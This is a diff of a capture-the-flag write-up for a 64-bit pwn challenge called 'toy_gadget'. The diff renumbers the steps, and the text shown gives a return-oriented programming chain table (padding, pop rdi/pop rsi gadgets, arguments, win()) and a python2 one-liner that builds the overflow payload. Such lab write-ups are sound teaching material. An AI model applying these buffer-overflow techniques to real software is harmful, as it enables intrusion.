@@ -266,17 +266,18 @@ Unlike 32-bit binaries where we can just add the 2 arguments right after the ret
 
 ### Manual
 
-| Step | Purpose                 | Value        | Little-Endian                      |
-| ---- | ----------------------- | ------------ | ---------------------------------- |
-| 1    | Padding to RIP          | `72`         | —                                  |
-| 2    | Stack alignment (`ret`) | `0x401016`   | `\x16\x10\x40\x00\x00\x00\x00\x00` |
-| 3    | `pop rdi ; ret`         | `0x4011b0`   | `\xb0\x11\x40\x00\x00\x00\x00\x00` |
-| 4    | Argument 1 (`rdi`)      | `0xed0cdaed` | `\xed\xda\x0c\xed\x00\x00\x00\x00` |
-| 5    | `pop rsi ; ret`         | `0x4011b2`   | `\xb2\x11\x40\x00\x00\x00\x00\x00` |
-| 6    | Argument 2 (`rsi`)      | `0xdeadc0de` | `\xde\xc0\xad\xde\x00\x00\x00\x00` |
-| 7    | `win()`                 | `0x4011e0`   | `\xe0\x11\x40\x00\x00\x00\x00\x00` |
+1. Steps
+	| Step | Purpose                 | Value        | Little-Endian                      |
+	| ---- | ----------------------- | ------------ | ---------------------------------- |
+	| 1    | Padding to RIP          | `72`         | -                                  |
+	| 2    | Stack alignment (`ret`) | `0x401016`   | `\x16\x10\x40\x00\x00\x00\x00\x00` |
+	| 3    | `pop rdi ; ret`         | `0x4011b0`   | `\xb0\x11\x40\x00\x00\x00\x00\x00` |
+	| 4    | Argument 1 (`rdi`)      | `0xed0cdaed` | `\xed\xda\x0c\xed\x00\x00\x00\x00` |
+	| 5    | `pop rsi ; ret`         | `0x4011b2`   | `\xb2\x11\x40\x00\x00\x00\x00\x00` |
+	| 6    | Argument 2 (`rsi`)      | `0xdeadc0de` | `\xde\xc0\xad\xde\x00\x00\x00\x00` |
+	| 7    | `win()`                 | `0x4011e0`   | `\xe0\x11\x40\x00\x00\x00\x00\x00` |
 
-1. Create Payload
+2. Create Payload
 
 	```
 	python2 -c 'print("A"*72+ "\xb0\x11\x40\x00\x00\x00\x00\x00" + "\xed\xda\x0c\xed\x00\x00\x00\x00" + "\xb2\x11\x40\x00\x00\x00\x00\x00" + "\xde\xc0\xad\xde\x00\x00\x00\x00" + "\xe0\x11\x40\x00\x00\x00\x00\x00" )' > payload
@@ -293,7 +294,7 @@ Unlike 32-bit binaries where we can just add the 2 arguments right after the ret
 	)' > payload
 	```
 
-2. Send it
+3. Send it
 
 	```
 	~/labs/ctf/cyberblitz2025/pwn/toy_gadget
@@ -309,7 +310,7 @@ Unlike 32-bit binaries where we can just add the 2 arguments right after the ret
 		<source src="{{site.cdn}}{{page.img_path}}spCJhivTgJ.mp4" type="video/mp4">
 	</video>
 
-3. Send it
+4. Send it
 
 	```python
 	from pwn import *
